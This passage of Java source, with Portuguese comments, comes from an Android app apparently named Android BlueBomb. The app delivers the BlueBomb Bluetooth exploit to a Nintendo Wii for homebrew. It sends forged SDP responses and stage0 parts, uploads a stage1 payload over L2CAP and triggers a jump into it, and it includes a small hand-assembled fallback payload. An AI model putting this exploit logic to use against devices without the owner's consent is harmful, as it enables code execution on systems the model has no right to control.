                if (requireExternalStage1) {
                    log("ERRO: diretório app-specific indisponível e stage1 externo é obrigatório. Abortando.");
                    return null;
                }
                log("v0.16: getExternalFilesDir retornou null. Usando fallback benigno.");
            }
        } catch (Exception e) {
            if (requireExternalStage1) {
                log("ERRO: falha ao carregar stage1.bin obrigatório: " + e.getMessage() + ". Abortando.");
                return null;
            }
            log("v0.16: falha ao carregar stage1.bin externo: " + e.getMessage() + ". Usando fallback benigno.");
        }

        // Fallback benigno executável da v0.13, com marcador v016.
        // Segurança: não chama IOS, não acessa NAND, não instala nada. Ele só escreve um
        // marcador em RAM baixa e entra em loop infinito. O efeito esperado é o Wii travar.
        byte[] payload = new byte[0x200];
        int o = 0;
        // lis r3,0x8000 ; ori r3,r3,0x3000 => 0x80003000
        putBe32(payload, o, 0x3C608000); o += 4;
        putBe32(payload, o, 0x60633000); o += 4;
        // grava "ANDR" em 0x80003000
        putBe32(payload, o, 0x3C80414E); o += 4;
        putBe32(payload, o, 0x60844452); o += 4;
        putBe32(payload, o, 0x90830000); o += 4;
        // grava "V14B" em 0x80003004
        putBe32(payload, o, 0x3C805631); o += 4;
        putBe32(payload, o, 0x60843500); o += 4;
        putBe32(payload, o, 0x90830004); o += 4;
        // flush/sync simples e loop infinito: b .
        putBe32(payload, o, 0x7C0004AC); o += 4;
        putBe32(payload, o, 0x4C00012C); o += 4;
        putBe32(payload, o, 0x48000000); o += 4;

        byte[] marker = "ANDROID_STAGE1_FALLBACK_JUMP_v0.16_NO_NAND\0".getBytes(StandardCharsets.US_ASCII);
        int markerOff = 0x80;
        System.arraycopy(marker, 0, payload, markerOff, Math.min(marker.length, payload.length - markerOff));
        return payload;
    }

    private void startStage1DiagnosticUpload() {
        if (stage1UploadStarted) return;
        stage1UploadStarted = true;
        new Thread(() -> {
            try { Thread.sleep(250); } catch (InterruptedException ignored) {}
            uploadStage1DiagnosticNoJump();
        }, "stage1-diag-upload").start();
    }

    private void uploadStage1DiagnosticNoJump() {
        if (activeConnectionHandle < 0) {
            log("===== STAGE1 PAYLOAD cancelado: sem conexão HCI ativa. =====");
            return;
        }
        byte[] payload = buildDiagnosticStage1Payload();
        if (payload == null) {
            log("===== STAGE1 PAYLOAD abortado: nenhum payload válido para enviar. =====");
            return;
        }
        final int PAYLOAD_MTU = 0x200;
        log(String.format(Locale.US,
                "===== STAGE1 PAYLOAD UPLOAD v0.16: size=%d bytes, mtu=0x%X, jumpFinal=%s =====",
                payload.length, PAYLOAD_MTU, stage1JumpEnabled ? "SIM" : "NÃO"));
        log("Stage1 payload será escrito em RAM via stage0. Depois do GD, enviaremos JUMP_PAYLOAD. Se for fallback interno: sem NAND. Se for stage1.bin externo: o comportamento depende do arquivo.");

        for (int off = 0; off < payload.length; off += PAYLOAD_MTU) {
            if (activeConnectionHandle < 0) {
                log("STAGE1 PAYLOAD abortado: conexão HCI caiu antes do próximo chunk.");
                return;
            }
            int len = Math.min(PAYLOAD_MTU, payload.length - off);
            int prevAck;
            synchronized (stage1AckLock) {
                prevAck = stage1AckCount;
            }
            sendStage1UploadChunk(payload, off, len);
            if (!waitForStage1Ack(prevAck, 4000)) {
                log(String.format(Locale.US,
                        "STAGE1 PAYLOAD: timeout esperando ACK GD do chunk off=0x%X len=%d.", off, len));
                return;
            }
            log(String.format(Locale.US,
                    "STAGE1 PAYLOAD: chunk confirmado por GD off=0x%X len=%d.", off, len));
        }

        log("===== STAGE1 PAYLOAD UPLOAD CONCLUÍDO: todos os chunks receberam GD. =====");
        if (stage1JumpEnabled) {
            log("STAGE1 JUMP ATIVADO: enviando comando JUMP_PAYLOAD agora. Se executou, o Wii deve travar/ficar parado.");
            sendStage1JumpCommand();
        } else {
            log("Jump final desativado.");
        }
    }

    private void sendStage1UploadChunk(byte[] payload, int off, int len) {
        byte[] cmd = new byte[4 + len];
        int p = 0;
        cmd[p++] = 0x09; // L2CAP_CMD_ECHO_RSP usado pelo stage0 como upload packet
        cmd[p++] = 0x00; // CONTINUE_REQUEST
        putLe16(cmd, p, len); p += 2;
        System.arraycopy(payload, off, cmd, p, len);
        sendL2capData(L2CAP_CID_SIGNALING, cmd,
                String.format(Locale.US, "STAGE1 PAYLOAD upload chunk off=0x%X len=%d", off, len));
    }

    private boolean waitForStage1Ack(int prevAck, long timeoutMs) {
        long deadline = System.currentTimeMillis() + timeoutMs;
        synchronized (stage1AckLock) {
            while (stage1AckCount <= prevAck && activeConnectionHandle >= 0) {
                long remain = deadline - System.currentTimeMillis();
                if (remain <= 0) break;
                try { stage1AckLock.wait(Math.min(remain, 250)); } catch (InterruptedException ignored) {}
            }
            return stage1AckCount > prevAck;
        }
    }

    private void sendStage1JumpCommand() {
        byte[] cmd = new byte[4];
        cmd[0] = 0x09; // L2CAP_CMD_ECHO_RSP / upload command family
        cmd[1] = 0x01; // JUMP_PAYLOAD
        putLe16(cmd, 2, 0x0000);
        sendL2capData(L2CAP_CID_SIGNALING, cmd, "STAGE1 JUMP PAYLOAD");
    }

    private void processSdpPacket(byte[] data, int start, int end) {
        if (end - start < 5) {
            log("  SDP curto demais: len=" + (end - start));
            return;
        }
        int pdu = u8(data[start]);
        int txid = be16(data, start + 1);
        int paramLen = be16(data, start + 3);
        int paramStart = start + 5;
        int paramEnd = Math.min(end, paramStart + paramLen);
        int continuationLen = 0;
        if (paramEnd < end) continuationLen = u8(data[paramEnd]);
        log(String.format(Locale.US,
                "  SDP PDU: 0x%02X(%s) txid=0x%04X paramLen=%d paramBytes=%d possibleContinuationLen=%d raw=%s",
                pdu, sdpPduName(pdu), txid, paramLen, Math.max(0, paramEnd - paramStart), continuationLen,
                hex(Arrays.copyOfRange(data, start, Math.min(end, start + 160)), Math.min(end - start, 160))));

        // v0.11: agora que o CID local 0x0040 fez o Wii mandar SDP real,
        // não devemos responder com SDP HID normal. O fluxo correto é usar esses
        // pedidos como gatilho para as respostas BlueBomb que o LinuxDiag enviou:
        //   ServiceSearchRequest      -> BlueBomb fake CCB ServiceSearchResponse
        //   ServiceAttributeRequest   -> Stage0 parte 1
        //   próxima PDU SDP recebida  -> Stage0 continuação
        if (stage0FirstSent && !stage0RemainderSent) {
            bluebombSdpFlowStarted = true;
            log("  SDP PDU recebido enquanto stage0 multipart está pendente; enviando continuação do stage0 real.");
            sendBlueBombStage0Remainder(0x0001);
            scheduleBlueBombHaxTrigger("apos envio do restante stage0 por SDP PDU recebido", stage0HaxDelayMs);
            return;
        }

        if (pdu == 0x02) { // ServiceSearchRequest
            bluebombSdpFlowStarted = true;
            log("  v0.11: ServiceSearchRequest real recebido; respondendo com BlueBomb fake CCB, não SDP normal.");
            sendSdpServiceSearchResponseBlueBombExact(0x0001, selectedBlueBombL2cb);
        } else if (pdu == 0x04) { // ServiceAttributeRequest
            bluebombSdpFlowStarted = true;
            if (!stage0FirstSent) {
                log("  v0.11: ServiceAttributeRequest real recebido; enviando Stage0 parte 1, não HID mínimo.");
                sendSdpServiceAttributeResponseStage0First(0x0001);
                scheduleStage0RemainderFallback(0x0001, stage0RemainderDelayMs);
            } else if (!stage0RemainderSent) {
                log("  v0.11: ServiceAttributeRequest/continuação recebido; enviando Stage0 restante.");
                sendBlueBombStage0Remainder(0x0001);
                scheduleBlueBombHaxTrigger("apos ServiceAttributeRequest de continuação", stage0HaxDelayMs);
            } else {
                log("  v0.11: ServiceAttributeRequest recebido após Stage0 completo; aguardando hax trigger/S0.");
            }
        } else if (pdu == 0x06) { // ServiceSearchAttributeRequest
            bluebombSdpFlowStarted = true;
            log("  v0.11: ServiceSearchAttributeRequest recebido; por segurança usando Stage0 parte 1 se ainda não foi enviado.");
            if (!stage0FirstSent) {
                sendSdpServiceAttributeResponseStage0First(0x0001);
                scheduleStage0RemainderFallback(0x0001, stage0RemainderDelayMs);
            }
        } else {
            log("  SDP PDU sem resposta automática v0.11; apenas logando.");
        }
    }

    private void sendSdpServiceSearchResponse(int txid) {
        byte[] params = new byte[9];
        putBe16(params, 0, 1); // TotalServiceRecordCount
        putBe16(params, 2, 1); // CurrentServiceRecordCount
        putBe32(params, 4, 0x00010000); // ServiceRecordHandle
        params[8] = 0x00; // no continuation
        sendSdpPdu(0x03, txid, params, "ServiceSearchResponse 1 handle");
    }

    private void sendSdpServiceAttributeResponse(int txid) {
        byte[] attrs = buildMinimalHidSdpAttributeList();
        byte[] params = new byte[2 + attrs.length + 1];
        putBe16(params, 0, attrs.length);
        System.arraycopy(attrs, 0, params, 2, attrs.length);
        params[params.length - 1] = 0x00;
        sendSdpPdu(0x05, txid, params, "ServiceAttributeResponse minimal HID attrs");
    }

    private void sendSdpServiceSearchAttributeResponse(int txid) {
        byte[] attrs = buildMinimalHidSdpAttributeList();
        byte[] params = new byte[2 + attrs.length + 1];
        putBe16(params, 0, attrs.length);
        System.arraycopy(attrs, 0, params, 2, attrs.length);
        params[params.length - 1] = 0x00;
        sendSdpPdu(0x07, txid, params, "ServiceSearchAttributeResponse minimal HID attrs");
    }

    private void sendSdpPdu(int pdu, int txid, byte[] params, String label) {
        sendSdpPduDeclaredLength(pdu, txid, params, params.length, label);
    }

    private void sendSdpPduDeclaredLength(int pdu, int txid, byte[] params, int declaredParamLength, String label) {
        byte[] packet = new byte[5 + params.length];
        packet[0] = (byte) (pdu & 0xFF);
        putBe16(packet, 1, txid);
        putBe16(packet, 3, declaredParamLength);
        System.arraycopy(params, 0, packet, 5, params.length);
        int cid = sdpRemoteCid >= 0 ? sdpRemoteCid : 0x0040;
        log("  SDP OUT " + label + " para remote CID=0x" + String.format(Locale.US, "%04X", cid)
                + String.format(Locale.US, " actualParamLen=%d declaredParamLen=%d", params.length, declaredParamLength));
        sendL2capData(cid, packet, "SDP " + label);
    }

    private byte[] buildMinimalHidSdpAttributeList() {
        // AttributeLists: uma Data Element Sequence pequena o bastante para caber sem continuação.
        // Não é o record perfeito do Wiimote ainda; é só para fazer o cliente avançar além do canal SDP.
        byte[] body = new byte[]{
                0x09, 0x00, 0x00, 0x0A, 0x00, 0x01, 0x00, 0x00,                         // ServiceRecordHandle
                0x09, 0x00, 0x01, 0x35, 0x03, 0x19, 0x11, 0x24,                         // ServiceClassIDList HID
                0x09, 0x00, 0x04, 0x35, 0x0D,                                           // ProtocolDescriptorList
                    0x35, 0x06, 0x19, 0x01, 0x00, 0x09, 0x00, 0x11,                     // L2CAP PSM 0x0011
                    0x35, 0x03, 0x19, 0x00, 0x11,                                       // HIDP
                0x09, 0x00, 0x09, 0x35, 0x08, 0x35, 0x06, 0x19, 0x11, 0x24, 0x09, 0x01, 0x00,
                0x09, 0x01, 0x00, 0x25, 0x13,                                           // ServiceName
                    'N','i','n','t','e','n','d','o',' ','R','V','L','-','C','N','T','-','0','1',
                0x09, 0x02, 0x00, 0x09, 0x01, 0x00,                                     // HIDDeviceReleaseNumber
                0x09, 0x02, 0x01, 0x09, 0x01, 0x11,                                     // HIDParserVersion
                0x09, 0x02, 0x02, 0x08, 0x04,                                           // HIDDeviceSubclass
                0x09, 0x02, 0x03, 0x08, 0x00,                                           // HIDCountryCode
                0x09, 0x02, 0x04, 0x28, 0x01,                                           // HIDVirtualCable
                0x09, 0x02, 0x05, 0x28, 0x01,                                           // HIDReconnectInitiate
                0x09, 0x02, 0x0D, 0x28, 0x01                                            // HIDNormallyConnectable
        };
        byte[] seq = new byte[2 + body.length];
        seq[0] = 0x35;
        seq[1] = (byte) (body.length & 0xFF);
        System.arraycopy(body, 0, seq, 2, body.length);
        return seq;
    }

    private byte[] readAclPacket(int timeoutMs) {
        byte[] buffer = new byte[2048];
        int len = connection.bulkTransfer(aclInEndpoint, buffer, buffer.length, timeoutMs);
        if (len <= 0) return null;
        return Arrays.copyOf(buffer, len);
    }

    private void sendHciCommandNoWait(int opcode, byte[] params, String label) {
        if (connection == null || hciInterface == null) {
            log("Não dá para enviar HCI " + label + ": dongle não aberto.");
            return;
        }
        byte[] command = new byte[3 + params.length];
        command[0] = (byte) (opcode & 0xFF);
        command[1] = (byte) ((opcode >> 8) & 0xFF);
        command[2] = (byte) (params.length & 0xFF);
        System.arraycopy(params, 0, command, 3, params.length);
        log(String.format(Locale.US, "HCI OUT sem espera %s opcode=0x%04X CMD=%s", label, opcode, hex(command, Math.min(command.length, 64))));

        int written;
        synchronized (controlTransferLock) {
            written = connection.controlTransfer(
                    0x20,
                    0x00,
                    0x0000,
                    hciInterface.getId(),
                    command,
                    command.length,
                    2000
            );
        }
        if (written < 0) {
            log("Falha no controlTransfer HCI OUT sem espera: " + label);
        } else if (written != command.length) {
            log("AVISO: HCI OUT sem espera escreveu " + written + " de " + command.length + " bytes.");
        }
    }

    private void runInWorker(Runnable runnable) {
        new Thread(runnable, "hci-worker").start();
    }

    private HciResponse sendHciCommandAndWait(int opcode, byte[] params, int timeoutMs) {
        if (connection == null || hciInterface == null) {
            log("Nenhum dongle aberto. Use primeiro: 'Abrir primeiro dongle BT/HCI'.");
            return null;
        }
        if (eventInEndpoint == null) {
            log("Sem endpoint de evento HCI. Não dá para confirmar resposta.");
            return null;
        }
        if (eventMonitorRunning) {
            log("Monitor HCI Events está ativo; pare os monitores antes de usar comandos HCI manuais.");
            return null;
        }

        byte[] command = new byte[3 + params.length];
        command[0] = (byte) (opcode & 0xFF);
        command[1] = (byte) ((opcode >> 8) & 0xFF);
        command[2] = (byte) (params.length & 0xFF);
        System.arraycopy(params, 0, command, 3, params.length);

        log(String.format(Locale.US, "Enviando HCI opcode=0x%04X len=%d", opcode, params.length));
        log("CMD: " + hex(command, Math.min(command.length, 64)) + (command.length > 64 ? " ..." : ""));

        // USB Bluetooth HCI command transport: class request, host-to-device, interface recipient.
        int written;
        synchronized (controlTransferLock) {
            written = connection.controlTransfer(
                    0x20,       // bmRequestType: Host-to-device | Class | Interface
                    0x00,       // bRequest: HCI command
                    0x0000,     // wValue
                    hciInterface.getId(),
                    command,
                    command.length,
                    timeoutMs
            );
        }

        if (written < 0) {
            log("Falha no controlTransfer do comando HCI.");
            return null;
        }
        if (written != command.length) {
            log("AVISO: controlTransfer escreveu " + written + " de " + command.length + " bytes.");
        }

        long deadline = System.currentTimeMillis() + timeoutMs;
        while (System.currentTimeMillis() < deadline) {
            int remaining = (int) Math.max(100, deadline - System.currentTimeMillis());
            byte[] event = readHciEvent(Math.min(remaining, 1000));
            if (event == null) continue;

            HciResponse response = new HciResponse(event);
            log("EVT: " + hex(event, event.length) + "  " + response.shortName());

            if (response.isCommandCompleteFor(opcode) || response.isCommandStatusFor(opcode)) {
                return response;
            }
        }

        log(String.format(Locale.US, "Timeout esperando resposta do opcode 0x%04X.", opcode));
        return null;
    }

    private byte[] readHciEvent(int timeoutMs) {
        byte[] buffer = new byte[260];
        int len = connection.bulkTransfer(eventInEndpoint, buffer, buffer.length, timeoutMs);
        if (len <= 0) return null;
        return Arrays.copyOf(buffer, len);
    }

    private String describeDevice(UsbDevice device) {
        StringBuilder sb = new StringBuilder();
        sb.append(shortDeviceName(device));
        sb.append(String.format(Locale.US,
                " vid=0x%04X pid=0x%04X class=0x%02X sub=0x%02X proto=0x%02X ifaces=%d",
                device.getVendorId(),
                device.getProductId(),
                device.getDeviceClass(),
                device.getDeviceSubclass(),
                device.getDeviceProtocol(),
                device.getInterfaceCount()));
        try {
            if (Build.VERSION.SDK_INT >= 21 && usbManager.hasPermission(device)) {
                if (device.getManufacturerName() != null) sb.append(" manufacturer='").append(device.getManufacturerName()).append("'");
                if (device.getProductName() != null) sb.append(" product='").append(device.getProductName()).append("'");
                if (device.getSerialNumber() != null) sb.append(" serial='").append(device.getSerialNumber()).append("'");
            }
        } catch (Exception ignored) {
        }
        return sb.toString();
    }

    private String shortDeviceName(UsbDevice device) {
        if (device == null) return "<null>";
        return device.getDeviceName();
    }

    private String endpointSummary(UsbEndpoint ep) {
        if (ep == null) return "<ausente>";
        return String.format(Locale.US,
                "addr=0x%02X dir=%s type=%s maxPacket=%d interval=%d",
                ep.getAddress(),
                epDirectionName(ep),
                epTypeName(ep),
                ep.getMaxPacketSize(),
                ep.getInterval());
    }

    private String epDirectionName(UsbEndpoint ep) {
        return ep.getDirection() == UsbConstants.USB_DIR_IN ? "IN" : "OUT";
    }

    private String epTypeName(UsbEndpoint ep) {
        switch (ep.getType()) {
            case UsbConstants.USB_ENDPOINT_XFER_CONTROL:
                return "CONTROL";
            case UsbConstants.USB_ENDPOINT_XFER_ISOC:
                return "ISO";
            case UsbConstants.USB_ENDPOINT_XFER_BULK:
                return "BULK";
            case UsbConstants.USB_ENDPOINT_XFER_INT:
                return "INT";
            default:
                return "type=" + ep.getType();
        }
    }

    private void log(String message) {
        String time = new SimpleDateFormat("HH:mm:ss", Locale.US).format(new Date());
        String line = "[" + time + "] " + message;
        synchronized (logBuffer) {
            logBuffer.append(line).append('\n');
        }
        Log.i(TAG, message);
        runOnUiThread(() -> {
            if (logView == null) return;
            String displayLine = line;
            if (!isDebugBuild()) {
                String friendly = releaseVisibleLogLine(message);
                if (friendly == null) return;
                displayLine = "[" + time + "] " + friendly;
            }
            logView.append(displayLine + "\n");
            if (scrollView != null) scrollView.post(() -> scrollView.fullScroll(View.FOCUS_DOWN));
        });
    }

    private String releaseVisibleLogLine(String message) {
        if (message == null) return null;
        if (releaseFinalStateLocked) {
            // Keep the final Release state stable. Late Bluetooth disconnects after launch are expected.
            if (message.contains("Log saved to")) return message;
            if (message.contains("Relatório latest salvo")) return null;
            return null;
        }
        if (message.startsWith("Starting Android BlueBomb")) {
            setReleaseStartState("inactive");
            setReleaseStatus("Starting Android BlueBomb...");
            return "Starting Android BlueBomb...";
        }
        if (message.contains("Dispositivos USB encontrados") || message.contains("USB devices found")) return "USB scan complete.";
        if (message.contains("No USB devices found") || message.contains("Nenhum dispositivo USB")) {
            setReleaseStartState("error");
            setReleaseStatus("No USB devices found. Restart the app and try again.");
            return "No USB devices found. Check the OTG adapter and Bluetooth dongle, then restart the app.";
        }
        if (message.contains("No compatible USB Bluetooth") || message.contains("Nenhum dongle")) {
            setReleaseStartState("error");
            setReleaseStatus("No compatible Bluetooth dongle was found.");
            return "No compatible USB Bluetooth dongle was found. Restart the app and try again.";
        }
        if (message.contains("USB permission denied") || message.contains("Permissão negada") || message.contains("Permission denied")) {
            setReleaseStartState("error");
            setReleaseStatus("USB permission denied. Restart the app.");
            return "USB permission denied. Restart the app and try again.";
        }
        if (message.contains("USB permission already granted") || message.contains("USB permission granted") || message.contains("Requesting USB permission") || message.contains("Permissão já existente") || message.contains("Permissão concedida") || message.contains("Pedindo permissão USB")) {
            return "USB permission granted.";
        }
        if (message.contains("Dongle aberto") || message.contains("Bluetooth dongle opened")) {
            setReleaseStatus("Bluetooth dongle opened.");
            return "Bluetooth dongle opened.";
        }
        if (message.contains("Bluetooth dongle is ready")) {
            setReleaseStatus("Press SYNC on the Wii, then tap Start Sync.");
            return "Bluetooth dongle is ready.";
        }
        if (message.contains("User confirmed SYNC")) {
            setReleaseStatus("Listening for the Wii...");
            return "Listening for the Wii...";
        }
        if (message.contains("Stage0 target selected")) return message;
        if (message.contains("stage1.bin embutido") || message.contains("STAGE1 ASSET")) return "Embedded stage1.bin is ready.";
        if (message.contains("Modo escuta ativo")) {
            setReleaseStatus("Listening for the Wii...");
            return "Listening for the Wii...";
        }
        if (message.contains("Still waiting for the Wii")) {
            setReleaseStatus("Still waiting. Press SYNC again.");
            return "Still waiting for the Wii. Press SYNC again.";
        }
        if (message.contains("no Wii connection was detected")) {
            setReleaseStartState("error");
            setReleaseStatus("Connection failed. Restart the app.");
            return "Connection failed. Restart the app and try again.";
        }
        if (message.contains("Connection Request de")) {
            setReleaseStatus("Wii connection request received...");
            return "Wii connection request received.";
        }
        if (message.contains("Connection Complete status=0x00")) {
            setReleaseStatus("Wii connected. Preparing exploit...");
            return "Wii connected.";
        }
        if (message.contains("STAGE0 RESPONDEU")) {
            setReleaseStatus("Wii exploit started. Loading BlueBomb...");
            return "Wii exploit started.";
        }
        if (message.contains("STAGE1 PAYLOAD UPLOAD")) {
            setReleaseStatus("Loading BlueBomb...");
            return "Loading BlueBomb...";
        }
        if (message.contains("STAGE0/STAGE1 ACK") && message.contains("0x4744")) return null;
        if (message.contains("chunk confirmado por GD")) return null;
        if (message.contains("UPLOAD CONCLUÍDO")) {
            setReleaseStatus("BlueBomb loaded. Launching...");
            return "BlueBomb loaded.";
        }
        if (message.contains("STAGE1 JUMP") || message.contains("JUMP PAYLOAD")) {
            setReleaseStartState("success");
            setReleaseStatus("BlueBomb launched. Check the Wii screen.");
            return "BlueBomb launched. Check the Wii screen.";
        }
        if (message.startsWith("ERRO") || message.startsWith("Erro") || message.startsWith("AVISO") || message.startsWith("WARNING")) {
            setReleaseStartState("error");
            setReleaseStatus("Error. Restart the app.");
            return "Error. Restart the app and try again.";
        }
        if (message.contains("Log saved to")) return message;
        if (message.contains("Relatório latest salvo")) return null;
        return null;
    }

    private void saveReport() {
        runInWorker(() -> {
            String stamp = new SimpleDateFormat("yyyyMMdd_HHmmss", Locale.US).format(new Date());
            String timestampedName = "Log-" + stamp + ".txt";
            String content;
            synchronized (logBuffer) {
                content = logBuffer.toString();
            }
            if (content.trim().isEmpty()) {
                log("Nothing to save: the internal log is empty.");
                return;
            }

            StringBuilder report = new StringBuilder();
            report.append("Android BlueBomb " + VERSION_NAME + "\n");
            report.append("Generated at: ").append(new SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.US).format(new Date())).append("\n");
            report.append("Package: ").append(getPackageName()).append("\n");
            report.append("Android SDK: ").append(Build.VERSION.SDK_INT).append("\n");
            report.append("Device: ").append(Build.MANUFACTURER).append(' ').append(Build.MODEL).append("\n");
            report.append("\n===== LOG =====\n");
            report.append(content);

            byte[] data = report.toString().getBytes(StandardCharsets.UTF_8);
            saveLatestReportToAppExternal(data);
            saveTimestampedReportToDocuments(timestampedName, data);
        });
    }

    private void saveLatestReportToAppExternal(byte[] data) {
        File dir = getExternalFilesDir(null);
        if (dir == null) {
            log("WARNING: getExternalFilesDir returned null. Could not save the app-specific latest report.");
            return;
        }
        File out = new File(dir, LATEST_REPORT_NAME);
        try (FileOutputStream fos = new FileOutputStream(out, false)) {
            fos.write(data);
            fos.flush();
            log("Latest report saved to: " + out.getAbsolutePath());
            log("ADB pull command:");
            log("adb pull /sdcard/Android/data/" + getPackageName() + "/files/" + LATEST_REPORT_NAME + " .");
        } catch (IOException e) {
            log("ERROR saving latest report: " + e.getClass().getSimpleName() + ": " + e.getMessage());
        }
    }

    private void saveTimestampedReportToDocuments(String filename, byte[] data) {
        if (Build.VERSION.SDK_INT < 29) {
            log("Saving to Documents with MediaStore requires Android 10+. Use the app-specific latest report path above.");
            return;
        }
        try {
            ContentResolver resolver = getContentResolver();
            ContentValues values = new ContentValues();
            values.put(MediaStore.MediaColumns.DISPLAY_NAME, filename);
            values.put(MediaStore.MediaColumns.MIME_TYPE, "text/plain");
            values.put(MediaStore.MediaColumns.RELATIVE_PATH, Environment.DIRECTORY_DOCUMENTS + "/AndroidBlueBomb");
            values.put(MediaStore.MediaColumns.IS_PENDING, 1);

            Uri uri = resolver.insert(MediaStore.Files.getContentUri("external"), values);
            if (uri == null) {
                log("WARNING: MediaStore returned a null URI. Use the app-specific path above.");
                return;
            }

            try (OutputStream os = resolver.openOutputStream(uri)) {
                if (os == null) throw new IOException("openOutputStream returned null");
                os.write(data);
                os.flush();
            }

            ContentValues done = new ContentValues();
            done.put(MediaStore.MediaColumns.IS_PENDING, 0);
            resolver.update(uri, done, null, null);

            log("Log saved to: Documents/AndroidBlueBomb/" + filename);
        } catch (Exception e) {
            log("WARNING: failed to save to Documents: " + e.getClass().getSimpleName() + ": " + e.getMessage());
            log("Use the app-specific latest report path above.");
        }
    }

    private static int u8(byte b) {
        return b & 0xFF;
    }

    private static int le16(byte[] data, int offset) {
        if (offset + 1 >= data.length) return 0;
        return (u8(data[offset]) | (u8(data[offset + 1]) << 8));
    }

    private static String hex(byte[] data, int max) {
        StringBuilder sb = new StringBuilder();
        int n = Math.min(data.length, max);
        for (int i = 0; i < n; i++) {
            if (i > 0) sb.append(' ');
            sb.append(String.format(Locale.US, "%02X", u8(data[i])));
        }
        return sb.toString();
    }

    private static String formatBdAddr(byte[] littleEndianAddr) {
        if (littleEndianAddr.length < 6) return hex(littleEndianAddr, littleEndianAddr.length);
        return String.format(Locale.US,
                "%02X:%02X:%02X:%02X:%02X:%02X",
                u8(littleEndianAddr[5]),
                u8(littleEndianAddr[4]),
                u8(littleEndianAddr[3]),
                u8(littleEndianAddr[2]),
                u8(littleEndianAddr[1]),
                u8(littleEndianAddr[0]));
    }


    private static int be16(byte[] data, int offset) {
        if (offset + 1 >= data.length) return 0;
        return ((u8(data[offset]) << 8) | u8(data[offset + 1]));
    }

    private static void putLe16(byte[] data, int offset, int value) {
        if (offset + 1 >= data.length) return;
        data[offset] = (byte) (value & 0xFF);
        data[offset + 1] = (byte) ((value >> 8) & 0xFF);
    }

    private static void putBe16(byte[] data, int offset, int value) {
        if (offset + 1 >= data.length) return;
        data[offset] = (byte) ((value >> 8) & 0xFF);
        data[offset + 1] = (byte) (value & 0xFF);
    }

    private static void putBe32(byte[] data, int offset, int value) {
        if (offset + 3 >= data.length) return;
        data[offset] = (byte) ((value >> 24) & 0xFF);
        data[offset + 1] = (byte) ((value >> 16) & 0xFF);
        data[offset + 2] = (byte) ((value >> 8) & 0xFF);
        data[offset + 3] = (byte) (value & 0xFF);
    }

    private static String l2capSignalName(int code) {
        switch (code) {
            case 0x01:
                return "Command Reject";
            case 0x02:
                return "Connection Request";
            case 0x03:
                return "Connection Response";
            case 0x04:
                return "Configure Request";
            case 0x05:
                return "Configure Response";
            case 0x06:
                return "Disconnection Request";
            case 0x07:
                return "Disconnection Response";
            case 0x08:
                return "Echo Request";
            case 0x09:
                return "Echo Response";
            case 0x0A:
                return "Information Request";
            case 0x0B:
                return "Information Response";
            default:
                return "Unknown";
        }
    }

    private static String sdpPduName(int pdu) {
        switch (pdu) {
            case 0x01:
                return "ErrorResponse";
            case 0x02:
                return "ServiceSearchRequest";
            case 0x03:
                return "ServiceSearchResponse";
            case 0x04:
                return "ServiceAttributeRequest";
            case 0x05:
                return "ServiceAttributeResponse";
            case 0x06:
                return "ServiceSearchAttributeRequest";
            case 0x07:
                return "ServiceSearchAttributeResponse";
            default:
                return "Unknown";
        }
    }

    private static String hciStatusName(int status) {
        if (status < 0) return "<sem status>";
        switch (status) {
            case 0x00:
                return "0x00 Success";
            case 0x01:
                return "0x01 Unknown HCI Command";
            case 0x02:
                return "0x02 Unknown Connection Identifier";
            case 0x03:
                return "0x03 Hardware Failure";
            case 0x0C:
                return "0x0C Command Disallowed";
            case 0x12:
                return "0x12 Invalid HCI Command Parameters";
            default:
                return String.format(Locale.US, "0x%02X", status);
        }
    }

    private static class HciResponse {
        final byte[] event;

        HciResponse(byte[] event) {
            this.event = event;
        }

        boolean isCommandCompleteFor(int opcode) {
            return event.length >= 6
                    && u8(event[0]) == 0x0E
                    && le16(event, 3) == opcode;
        }

        boolean isCommandStatusFor(int opcode) {
            return event.length >= 6
                    && u8(event[0]) == 0x0F
                    && le16(event, 4) == opcode;
        }

        int statusByte() {
            if (event.length < 1) return -1;
            int eventCode = u8(event[0]);
            if (eventCode == 0x0E && event.length >= 6) return u8(event[5]);
            if (eventCode == 0x0F && event.length >= 3) return u8(event[2]);
            return -1;
        }

        String shortName() {
            if (event.length < 1) return "<evento vazio>";
            int code = u8(event[0]);
            switch (code) {
                case 0x0E:
                    return String.format(Locale.US, "Command Complete opcode=0x%04X status=%s", le16(event, 3), hciStatusName(statusByte()));
                case 0x0F:
                    return String.format(Locale.US, "Command Status opcode=0x%04X status=%s", le16(event, 4), hciStatusName(statusByte()));
                case 0x03:
                    return "Connection Complete";
                case 0x04:
                    return "Connection Request";
                case 0x05:
                    return "Disconnection Complete";
                case 0x13:
                    return "Number Of Completed Packets";
                case 0x16:
                    return "PIN Code Request";
                case 0x17:
                    return "Link Key Request";
                case 0x31:
                    return "IO Capability Request";
                default:
                    return String.format(Locale.US, "Event 0x%02X", code);
            }
        }

        String summary() {
            return shortName() + " raw=" + hex(event, event.length);
        }
    }
}
